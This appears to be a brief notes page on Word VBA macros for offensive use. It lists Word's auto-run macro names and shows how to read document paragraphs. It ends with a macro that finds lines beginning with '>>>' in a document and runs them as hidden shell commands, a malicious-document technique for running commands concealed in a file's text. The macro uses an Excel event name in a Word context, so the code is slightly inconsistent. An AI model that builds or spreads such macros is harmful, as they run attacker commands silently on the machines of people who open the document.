# VBA in Word

## Auto run macros

{% embed url="https://learn.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros" %}

| **Macro name** | **When it runs**                               |
| -------------- | ---------------------------------------------- |
| AutoExec       | When you start Word or load a global template  |
| AutoNew        | Each time you create a new document            |
| AutoOpen       | Each time you open an existing document        |
| AutoClose      | Each time you close a document                 |
| AutoExit       | When you exit Word or unload a global template |

## Read text from document

```vbnet
Dim singleLine As Paragraph
Dim lineText As String

For Each singleLine In ActiveDocument.Paragraphs
	lineText = singleLine.Range.Text

	'// parse the text here...

Next singleLine
```

## Macro example: run command hidden inside document text

```vba
Sub Workbook_Open()
    Dim singleLine As Paragraph
    Dim lineText As String

    For Each singleLine In ActiveDocument.Paragraphs
        lineText = singleLine.Range.Text
        If lineText Like ">>>*" Then
            Dim cmd
            cmd = Right(lineText, Len(lineText) - 3)
            Shell cmd, 0
        End If
    Next singleLine
End Sub
```
